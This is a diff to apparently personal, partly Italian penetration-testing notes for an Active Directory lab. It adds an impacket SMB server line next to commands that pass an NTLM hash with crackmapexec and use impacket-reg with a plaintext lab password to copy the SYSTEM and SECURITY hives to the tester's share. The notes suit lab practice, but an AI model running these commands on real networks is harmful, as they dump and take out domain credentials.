@@ -25,6 +25,7 @@ crackmapexec smb 192.168.56.10-23 -u Administrator -H 'dbd13e1c4e338284ac4e9874f
 *LSA secrets and Cached domain logon information*
 dumpiamo HKLM\\SECURITY e HKLM\\SYSTEM
 ```bash
+impacket-smbserver -smb2support share .
 impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SYSTEM' -o '\\192.168.56.6\share'
 impacket-reg NORTH/jeor.mormont:'_L0ngCl@w_'@192.168.56.22 save -keyName 'HKLM\SECURITY' -o '\\192.168.56.6\share'
 ```
